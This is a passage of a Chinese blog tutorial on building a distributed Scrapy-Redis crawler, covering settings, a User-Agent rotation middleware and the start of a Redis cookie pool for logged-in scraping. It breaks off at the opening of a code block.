                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>1.3k</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>1 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/4048.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> Python <i class="label-arrow"></i>
                  </a>
                  <a href="/4048.html" class="post-title-link" itemprop="url">小白进阶之Scrapy第三篇（基于Scrapy-Redis的分布式以及cookies池）</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <p>啥话都不说了、进入正题。 <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2017/02/QQ图片20170205084843.jpg" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2017/02/QQ图片20170205084843.jpg" alt="QQ图片20170205084843"></a> 首先我们更新一下 scrapy 版本。最新版为 1.3 再说一遍 Windows 的小伙伴儿 pip 是装不上 Scrapy 的。推荐使用 anaconda 、不然还是老老实实用 Linux 吧</p>
                  <figure class="highlight routeros">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">conda install <span class="attribute">scrapy</span>==1.3</span><br><span class="line">或者</span><br><span class="line">pip install <span class="attribute">scrapy</span>==1.3</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>安装 Scrapy-Redis</p>
                  <figure class="highlight mipsasm">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">conda <span class="keyword">install </span><span class="keyword">scrapy-redis</span></span><br><span class="line"><span class="keyword">或者</span></span><br><span class="line"><span class="keyword">pip </span><span class="keyword">install </span><span class="keyword">scrapy-redis</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>需要注意： Python 版本为 2.7，3.4 或者 3.5 。个人使用 3.6 版本也没有问题 Redis&gt;=2.8 Scrapy&gt;=1.0 Redis-py&gt;=2.1 。 3.X 版本的 Python 都是自带 Redis-py 其余小伙伴如果没有的话、自己 pip 安装一下。 开始搞事！ 开始之前我们得知道 scrapy-redis 的一些配置：PS 这些配置是写在 Scrapy 项目的 settings.py 中的！</p>
                  <figure class="highlight vala">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="meta">#启用Redis调度存储请求队列</span></span><br><span class="line">SCHEDULER = <span class="string">"scrapy_redis.scheduler.Scheduler"</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#确保所有的爬虫通过Redis去重</span></span><br><span class="line">DUPEFILTER_CLASS = <span class="string">"scrapy_redis.dupefilter.RFPDupeFilter"</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#默认请求序列化使用的是pickle 但是我们可以更改为其他类似的。PS：这玩意儿2.X的可以用。3.X的不能用</span></span><br><span class="line"><span class="meta">#SCHEDULER_SERIALIZER = "scrapy_redis.picklecompat"</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#不清除Redis队列、这样可以暂停/恢复 爬取</span></span><br><span class="line"><span class="meta">#SCHEDULER_PERSIST = True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#使用优先级调度请求队列 （默认使用）</span></span><br><span class="line"><span class="meta">#SCHEDULER_QUEUE_CLASS = 'scrapy_redis.queue.PriorityQueue'</span></span><br><span class="line"><span class="meta">#可选用的其它队列</span></span><br><span class="line"><span class="meta">#SCHEDULER_QUEUE_CLASS = 'scrapy_redis.queue.FifoQueue'</span></span><br><span class="line"><span class="meta">#SCHEDULER_QUEUE_CLASS = 'scrapy_redis.queue.LifoQueue'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#最大空闲时间防止分布式爬虫因为等待而关闭</span></span><br><span class="line"><span class="meta">#这只有当上面设置的队列类是SpiderQueue或SpiderStack时才有效</span></span><br><span class="line"><span class="meta">#并且当您的蜘蛛首次启动时，也可能会阻止同一时间启动（由于队列为空）</span></span><br><span class="line"><span class="meta">#SCHEDULER_IDLE_BEFORE_CLOSE = 10</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#将清除的项目在redis进行处理</span></span><br><span class="line">ITEM_PIPELINES = &#123;</span><br><span class="line">    <span class="string">'scrapy_redis.pipelines.RedisPipeline'</span>: <span class="number">300</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#序列化项目管道作为redis Key存储</span></span><br><span class="line"><span class="meta">#REDIS_ITEMS_KEY = '%(spider)s:items'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#默认使用ScrapyJSONEncoder进行项目序列化</span></span><br><span class="line"><span class="meta">#You can use any importable path to a callable object.</span></span><br><span class="line"><span class="meta">#REDIS_ITEMS_SERIALIZER = 'json.dumps'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#指定连接到redis时使用的端口和地址（可选）</span></span><br><span class="line"><span class="meta">#REDIS_HOST = 'localhost'</span></span><br><span class="line"><span class="meta">#REDIS_PORT = 6379</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#指定用于连接redis的URL（可选）</span></span><br><span class="line"><span class="meta">#如果设置此项，则此项优先级高于设置的REDIS_HOST 和 REDIS_PORT</span></span><br><span class="line"><span class="meta">#REDIS_URL = 'redis://user:pass@hostname:9001'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#自定义的redis参数（连接超时之类的）</span></span><br><span class="line"><span class="meta">#REDIS_PARAMS  = &#123;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#自定义redis客户端类</span></span><br><span class="line"><span class="meta">#REDIS_PARAMS['redis_cls'] = 'myproject.RedisClient'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#如果为True，则使用redis的'spop'进行操作。</span></span><br><span class="line"><span class="meta">#如果需要避免起始网址列表出现重复，这个选项非常有用。开启此选项urls必须通过sadd添加，否则会出现类型错误。</span></span><br><span class="line"><span class="meta">#REDIS_START_URLS_AS_SET = False</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#RedisSpider和RedisCrawlSpider默认 start_usls 键</span></span><br><span class="line"><span class="meta">#REDIS_START_URLS_KEY = '%(name)s:start_urls'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#设置redis使用utf-8之外的编码</span></span><br><span class="line"><span class="meta">#REDIS_ENCODING = 'latin1'</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>请各位小伙伴儿自行挑选需要的配置写到项目的 settings.py 文件中 英语渣靠 Google、看不下去的小伙伴儿看这儿：<a href="http://scrapy-redis.readthedocs.io/en/stable/readme.html" target="_blank" rel="noopener">http://scrapy-redis.readthedocs.io/en/stable/readme.html</a> 继续在我们上一篇博文中的爬虫程序修改： 首先把我们需要的 redis 配置文件写入 settings.py 中： 如果你的 redis 数据库按照前一片博文配置过则需要以下至少三项</p>
                  <figure class="highlight ini">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="attr">SCHEDULER</span> = <span class="string">"scrapy_redis.scheduler.Scheduler"</span></span><br><span class="line"></span><br><span class="line"><span class="attr">DUPEFILTER_CLASS</span> = <span class="string">"scrapy_redis.dupefilter.RFPDupeFilter"</span></span><br><span class="line"></span><br><span class="line"><span class="attr">REDIS_URL</span> = <span class="string">'redis://root:密码@主机ＩＰ:端口'</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>第三项请按照你的实际情况配置。 Nice 配置文件写到这儿。我们来做一些基本的反爬虫设置 最基本的一个切换 UserAgent！ 首先在项目文件中新建一个 useragent.py 用来写一堆 User-Agent（可以去网上找更多，也可以用下面这些现成的）</p>
                  <figure class="highlight smalltalk">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">agents = [</span><br><span class="line">    <span class="comment">"Mozilla/5.0 (Linux; U; Android 2.3.6; en-us; Nexus S Build/GRK39F) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"</span>,</span><br><span class="line">    <span class="comment">"Avant Browser/1.2.789rel1 (http://www.avantbrowser.com)"</span>,</span><br><span class="line">    <span class="comment">"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.5"</span>,</span><br><span class="line">    <span class="comment">"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9"</span>,</span><br><span class="line">    <span class="comment">"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7"</span>,</span><br><span class="line">    <span class="comment">"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14"</span>,</span><br><span class="line">    <span class="comment">"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14"</span>,</span><br><span class="line">    <span class="comment">"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20"</span>,</span><br><span class="line">    <span class="comment">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27"</span>,</span><br><span class="line">    <span class="comment">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1"</span>,</span><br><span class="line">    <span class="comment">"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2"</span>,</span><br><span class="line">    <span class="comment">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7"</span>,</span><br><span class="line">    <span class="comment">"Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2pre"</span>,</span><br><span class="line">    <span class="comment">"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10"</span>,</span><br><span class="line">    <span class="comment">"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)"</span>,</span><br><span class="line">    <span class="comment">"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5"</span>,</span><br><span class="line">    <span class="comment">"Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)"</span>,</span><br><span class="line">    <span class="comment">"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1"</span>,</span><br><span class="line">    <span class="comment">"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1"</span>,</span><br><span class="line">    <span class="comment">"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0"</span>,</span><br><span class="line">    <span class="comment">"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2"</span>,</span><br><span class="line">    <span class="comment">"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"</span>,</span><br><span class="line">    <span class="comment">"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre"</span>,</span><br><span class="line">    <span class="comment">"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0 )"</span>,</span><br><span class="line">    <span class="comment">"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98; Win 9x 4.90)"</span>,</span><br><span class="line">    <span class="comment">"Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a"</span>,</span><br><span class="line">    <span class="comment">"Mozilla/2.02E (Win95; U)"</span>,</span><br><span class="line">    <span class="comment">"Mozilla/3.01Gold (Win95; I)"</span>,</span><br><span class="line">    <span class="comment">"Mozilla/4.8 [en] (Windows NT 5.1; U)"</span>,</span><br><span class="line">    <span class="comment">"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)"</span>,</span><br><span class="line">    <span class="comment">"HTC_Dream Mozilla/5.0 (Linux; U; Android 1.5; en-ca; Build/CUPCAKE) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1"</span>,</span><br><span class="line">    <span class="comment">"Mozilla/5.0 (hp-tablet; Linux; hpwOS/3.0.2; U; de-DE) AppleWebKit/534.6 (KHTML, like Gecko) wOSBrowser/234.40.1 Safari/534.6 TouchPad/1.0"</span>,</span><br><span class="line">    <span class="comment">"Mozilla/5.0 (Linux; U; Android 1.5; en-us; sdk Build/CUPCAKE) AppleWebkit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1"</span>,</span><br><span class="line">    <span class="comment">"Mozilla/5.0 (Linux; U; Android 2.1; en-us; Nexus One Build/ERD62) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17"</span>,</span><br><span class="line">    <span class="comment">"Mozilla/5.0 (Linux; U; Android 2.2; en-us; Nexus One Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"</span>,</span><br><span class="line">    <span class="comment">"Mozilla/5.0 (Linux; U; Android 1.5; en-us; htc_bahamas Build/CRB17) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1"</span>,</span><br><span class="line">    <span class="comment">"Mozilla/5.0 (Linux; U; Android 2.1-update1; de-de; HTC Desire 1.19.161.5 Build/ERE27) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17"</span>,</span><br><span class="line">    <span class="comment">"Mozilla/5.0 (Linux; U; Android 2.2; en-us; Sprint APA9292KT Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"</span>,</span><br><span class="line">    <span class="comment">"Mozilla/5.0 (Linux; U; Android 1.5; de-ch; HTC Hero Build/CUPCAKE) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1"</span>,</span><br><span class="line">    <span class="comment">"Mozilla/5.0 (Linux; U; Android 2.2; en-us; ADR6300 Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"</span>,</span><br><span class="line">    <span class="comment">"Mozilla/5.0 (Linux; U; Android 2.1; en-us; HTC Legend Build/cupcake) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17"</span>,</span><br><span class="line">    <span class="comment">"Mozilla/5.0 (Linux; U; Android 1.5; de-de; HTC Magic Build/PLAT-RC33) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1 FirePHP/0.3"</span>,</span><br><span class="line">    <span class="comment">"Mozilla/5.0 (Linux; U; Android 1.6; en-us; HTC_TATTOO_A3288 Build/DRC79) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1"</span>,</span><br><span class="line">    <span class="comment">"Mozilla/5.0 (Linux; U; Android 1.0; en-us; dream) AppleWebKit/525.10  (KHTML, like Gecko) Version/3.0.4 Mobile Safari/523.12.2"</span>,</span><br><span class="line">    <span class="comment">"Mozilla/5.0 (Linux; U; Android 1.5; en-us; T-Mobile G1 Build/CRB43) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari 525.20.1"</span>,</span><br><span class="line">    <span class="comment">"Mozilla/5.0 (Linux; U; Android 1.5; en-gb; T-Mobile_G2_Touch Build/CUPCAKE) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1"</span>,</span><br><span class="line">    <span class="comment">"Mozilla/5.0 (Linux; U; Android 2.0; en-us; Droid Build/ESD20) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17"</span>,</span><br><span class="line">    <span class="comment">"Mozilla/5.0 (Linux; U; Android 2.2; en-us; Droid Build/FRG22D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"</span>,</span><br><span class="line">    <span class="comment">"Mozilla/5.0 (Linux; U; Android 2.0; en-us; Milestone Build/ SHOLS_U2_01.03.1) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17"</span>,</span><br><span class="line">    <span class="comment">"Mozilla/5.0 (Linux; U; Android 2.0.1; de-de; Milestone Build/SHOLS_U2_01.14.0) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17"</span>,</span><br><span class="line">    <span class="comment">"Mozilla/5.0 (Linux; U; Android 3.0; en-us; Xoom Build/HRI39) AppleWebKit/525.10  (KHTML, like Gecko) Version/3.0.4 Mobile Safari/523.12.2"</span>,</span><br><span class="line">    <span class="comment">"Mozilla/5.0 (Linux; U; Android 0.5; en-us) AppleWebKit/522  (KHTML, like Gecko) Safari/419.3"</span>,</span><br><span class="line">    <span class="comment">"Mozilla/5.0 (Linux; U; Android 1.1; en-gb; dream) AppleWebKit/525.10  (KHTML, like Gecko) Version/3.0.4 Mobile Safari/523.12.2"</span>,</span><br><span class="line">    <span class="comment">"Mozilla/5.0 (Linux; U; Android 2.0; en-us; Droid Build/ESD20) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17"</span>,</span><br><span class="line">    <span class="comment">"Mozilla/5.0 (Linux; U; Android 2.1; en-us; Nexus One Build/ERD62) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17"</span>,</span><br><span class="line">    <span class="comment">"Mozilla/5.0 (Linux; U; Android 2.2; en-us; Sprint APA9292KT Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"</span>,</span><br><span class="line">    <span class="comment">"Mozilla/5.0 (Linux; U; Android 2.2; en-us; ADR6300 Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"</span>,</span><br><span class="line">    <span class="comment">"Mozilla/5.0 (Linux; U; Android 2.2; en-ca; GT-P1000M Build/FROYO) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"</span>,</span><br><span class="line">    <span class="comment">"Mozilla/5.0 (Linux; U; Android 3.0.1; fr-fr; A500 Build/HRI66) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13"</span>,</span><br><span class="line">    <span class="comment">"Mozilla/5.0 (Linux; U; Android 3.0; en-us; Xoom Build/HRI39) AppleWebKit/525.10  (KHTML, like Gecko) Version/3.0.4 Mobile Safari/523.12.2"</span>,</span><br><span class="line">    <span class="comment">"Mozilla/5.0 (Linux; U; Android 1.6; es-es; SonyEricssonX10i Build/R1FA016) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1"</span>,</span><br><span class="line">    <span class="comment">"Mozilla/5.0 (Linux; U; Android 1.6; en-us; SonyEricssonX10i Build/R1AA056) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1"</span>,</span><br><span class="line">]</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>现在我们来重写一下 Scrapy 的下载中间件（哇靠！！重写中间件 好高端啊！！会不会好难!!!放心！！！So Easy！！跟我做！包教包会，毕竟不会你也不能顺着网线来打我啊）： 关于重写中间件的详细情况 请参考 官方文档：<a href="http://scrapy-chs.readthedocs.io/zh_CN/latest/topics/downloader-middleware.html#scrapy.contrib.downloadermiddleware.DownloaderMiddleware" target="_blank" rel="noopener">http://scrapy-chs.readthedocs.io/zh_CN/latest/topics/downloader-middleware.html#scrapy.contrib.downloadermiddleware.DownloaderMiddleware</a> 在项目中新建一个 middlewares.py 的文件（如果你使用的新版本的 Scrapy，在新建的时候会有这么一个文件，直接用就好了） 首先导入 UserAgentMiddleware 毕竟我们要重写它啊！</p>
                  <figure class="highlight clean">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">import</span> json ##处理json的包</span><br><span class="line"><span class="keyword">import</span> redis #Python操作redis的包</span><br><span class="line"><span class="keyword">import</span> random #随机选择</span><br><span class="line"><span class="keyword">from</span> .useragent <span class="keyword">import</span> agents #导入前面的</span><br><span class="line"><span class="keyword">from</span> scrapy.downloadermiddlewares.useragent <span class="keyword">import</span> UserAgentMiddleware #UserAegent中间件</span><br><span class="line"><span class="keyword">from</span> scrapy.downloadermiddlewares.retry <span class="keyword">import</span> RetryMiddleware #重试中间件</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>开写：</p>
                  <figure class="highlight ruby">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserAgentmiddleware</span>(<span class="title">UserAgentMiddleware</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_request</span><span class="params">(<span class="keyword">self</span>, request, spider)</span></span><span class="symbol">:</span></span><br><span class="line">        agent = random.choice(agents)</span><br><span class="line">        request.headers[<span class="string">"User-Agent"</span>] = agent</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>第一行：定义了一个类 UserAgentmiddleware 继承自 UserAgentMiddleware 第二行：定义了函数<code>process_request</code>(<em>request</em>, <em>spider</em>)为什么定义这个函数，因为 Scrapy 每一个 request 通过中间 件都会调用这个方法。 <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2017/02/QQ20170206-223156.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2017/02/QQ20170206-223156.png" alt="QQ20170206-223156"></a> 第三行：随机选择一个 User-Agent 第四行：设置 request 的 User-Agent 为我们随机的 User-Agent ^_^Y(^o^)Y 一个中间件写完了！哈哈 是不是 So easy！ 下面就需要登陆了。这次我们不用上一篇博文的 FromRequest 来实现登陆了。我们来使用 Cookie 登陆。这样的话我们需要重写 Cookie 中间件！分布式爬虫啊！你不能手动的给每个 Spider 写一个 Cookie 吧。而且你还不会知道这个 Cookie 到底有没有失效。所以我们需要维护一个 Cookie 池(这个 cookie 池用 redis)。 好！来理一理思路，维护一个 Cookie 池最基本需要具备些什么功能呢？</p>
                  <ol>
                    <li>获取 Cookie</li>
                    <li>更新 Cookie</li>
                    <li>删除 Cookie</li>
                    <li>判断 Cookie 是否可用进行相对应的操作（比如重试）</li>
                  </ol>
                  <p>好，我们先做前三个对 Cookie 进行操作。 首先我们在项目中新建一个 cookies.py 的文件用来写我们需要对 Cookie 进行的操作。 haoduofuli/haoduofuli/cookies.py: 首先日常导入我们需要的文件：</p>
                  <figure class="highlight routeros">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line">import redis</span><br><span class="line">import logging</span><br><span class="line"><span class="keyword">from</span> .settings import REDIS_URL ##获取settings.py中的REDIS_URL</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>首先我们把登陆用的账号密码 以 Key:value 的形式存入 redis 数据库。不推荐使用 db0（这是 Scrapy-redis 默认使用的，账号密码单独使用一个 db 进行存储。） <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2017/02/QQ20170207-221128@2x.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2017/02/QQ20170207-221128@2x.png" alt="QQ20170207-221128@2x"></a> 就像这个样子。 解决第一个问题：获取 Cookie：</p>
                  <figure class="highlight routeros">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre>
                        </td>
                        <td class="code">
